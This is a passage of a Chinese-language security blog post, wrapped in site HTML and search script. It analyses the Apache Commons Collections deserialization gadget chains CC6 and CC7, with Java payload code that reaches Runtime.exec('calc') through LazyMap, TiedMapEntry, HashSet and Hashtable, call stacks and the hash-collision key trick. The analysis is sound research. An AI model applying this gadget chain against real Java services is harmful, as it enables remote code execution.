+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Transformer Testtransformer = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">            Map lazyMap=LazyMap.decorate(map,Testtransformer);</span><br><span class="line"></span><br><span class="line">            TiedMapEntry tiedMapEntry=<span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            HashSet hashSet=<span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">            hashSet.add(tiedMapEntry);</span><br><span class="line">            lazyMap.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令</span></span><br><span class="line">            Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            field.set(Testtransformer, transformers);</span><br></pre></td></tr></table></figure>
+<p>看 HashSet 的 readobject() 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">	......</span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用了 map.put()  ，这里的 map 就是 HashMap</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302183233785.png" alt="image-20210302183233785"></p>
+<p>继续看 HashMap#put() </p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302183718799.png" alt="image-20210302183718799"></p>
+<p>在 HashMap#put()  会用  HashMap#hash() 处理 key 继续跟进，这里的 key 就是前边构造的 TiedMapEntry</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302184652108.png" alt="image-20210302184652108"></p>
+<p>这里调用了 key.hashCode() 也就是 TiedMapEntry#hashCode(),继续看 TiedMapEntry#hashCode()</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302184812406.png" alt="image-20210302184812406"></p>
+<p>在TiedMapEntry#hashCode() 里调用了自身的 getvalue 方法</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210302185135224.png" alt="image-20210302185135224"></p>
+<p>在这里调用了 map.get() 也就是 lazyMap#get() ，后面就和 CC1 一样了</p>
+<h2 id="总结一下-2"><a href="#总结一下-2" class="headerlink" title="总结一下"></a>总结一下</h2><p>调用栈:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectInputStream.readObject()</span><br><span class="line">       java.util.HashSet.readObject()</span><br><span class="line">           java.util.HashMap.put()</span><br><span class="line">           java.util.HashMap.hash()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">               org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                   org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                       					org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                       org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                       java.lang.reflect.Method.invoke()</span><br><span class="line">                           java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>
+<h1 id="CommonCollections7"><a href="#CommonCollections7" class="headerlink" title="CommonCollections7"></a>CommonCollections7</h1><p><code>commons-collections3.1</code> 由 HashTable 触发，比较通用的一个版本</p>
+<h2 id="利用链分析-5"><a href="#利用链分析-5" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CC7 同 CC6 与CC5 一样都是对 CC1 的改进，CC7 用的是 Hashtable</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303113147348.png" alt="image-20210303113147348"></p>
+<p>直接看 Hashtable#readobject()</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303113244652.png" alt="image-20210303113244652"></p>
+<p>调用了自身的 reconstitutionPut() 方法</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303113357299.png" alt="image-20210303113357299"></p>
+<p>在 HashTable#reconstitutionPut() 会将 HashTable 里的键名(key)互相比较，payload 中我们构造 HashTable 时存入了两个LazyMap 作为 key。所以这里相当于调用了 LazyMap#equals()</p>
+<p>LazyMap 类并没有实现 equals() 方法，在它的父类 AbstractMapDecorator 里定义了。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303113804993.png" alt="image-20210303113804993"></p>
+<p>在AbstractMapDecorator#equals()  又会调用 this.map.equals() 这里的 this.map 是构造 LazyMap 时的 HashMap</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303123658274.png" alt="image-20210303123658274"></p>
+<p>继续看 HashMap#equals() ，在 HashMap 的父类 AbstractMap 里定义的 equals() </p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303124114485.png" alt="image-20210303124114485"></p>
+<p>在这里就调用了  lazyMap#get() ，后面就和 CC1 一样了</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303124420614.png" alt="image-20210303124420614"></p>
+<p>在构造 LazyMap 的时候分别 put 了两个键值 yy zZ。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303124736520.png" alt="image-20210303124736520"></p>
+<p>原因是在 HashTable#reconstitutionPut() 中进入<code> e.key.equals(key)</code>需要满足<code>e.hash == hash</code>,也就是 key 的 hashcode 需要相同，打印下”yy”和”zZ”的 hashCode 之后会发现哈希值是一样的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(&quot;yy&quot;.hashCode()); &#x2F;&#x2F; 3872</span><br><span class="line">System.out.println(&quot;zZ&quot;.hashCode()); &#x2F;&#x2F; 3872</span><br></pre></td></tr></table></figure>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303124923198.png"></p>
+<p>后边 lazyMap2.remove(“yy”);是因为hashtable有两次put的操作，在第二次<code>hashtable.put(lazyMap2, 2);</code>时，会触发LazyMap 的 get 方法，会新增一个 key/value 值相同的键值对，所以此时会多出一个<code>yy</code>。</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90.assets/image-20210303125503819.png" alt="image-20210303125503819"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/03/01/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2021-2109%EF%BC%89%E7%9A%84/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-03-02 13:22:26
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                        <b>#</b> 反序列化
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/CommonCollections/" title="CommonCollections">
+                        <b>#</b> CommonCollections
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonCollections2"><span class="toc-text">CommonCollections2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%EF%BC%9A"><span class="toc-text">总结一下：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonCollections3"><span class="toc-text">CommonCollections3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-1"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%EF%BC%9A-1"><span class="toc-text">总结一下：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonCollections4"><span class="toc-text">CommonCollections4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-2"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B"><span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonCollections5"><span class="toc-text">CommonCollections5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-3"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-1"><span class="toc-text">总结一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CommonCollections6"><span class="toc-text">CommonCollections6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-4"><span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B-2"><span class="toc-text">总结一下</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonCollections7"><span class="toc-text">CommonCollections7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90-5"><span class="toc-text">利用链分析</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Weik1">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="1252820849@qq.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © Oranges 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=i;var e=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function i(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}i(),n.addEventListener("scroll",function(){var t,e;t=i,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
